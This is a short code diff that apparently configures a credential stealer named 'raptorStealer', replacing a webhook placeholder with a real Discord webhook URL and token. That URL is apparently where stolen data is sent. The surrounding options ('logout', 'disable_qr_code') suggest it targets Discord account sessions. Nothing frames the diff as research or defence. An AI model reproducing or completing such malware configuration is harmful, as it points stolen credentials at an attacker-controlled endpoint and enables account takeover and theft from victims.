@@ -15,7 +15,7 @@ async function getIp() {
 var config = {
     brand: "raptorStealer",
 
-    webhook: "%WEBHOOK_LINK%",
+    webhook: "https://discord.com/api/webhooks/1118705170059120791/YkEDflvAFzzQyQ94js6sQ2m-lkeV-tjIaoZ94o5YqujipND-5K6VDDbHFsQDe23_uEzy",
 
     logout: true,
     disable_qr_code: true,
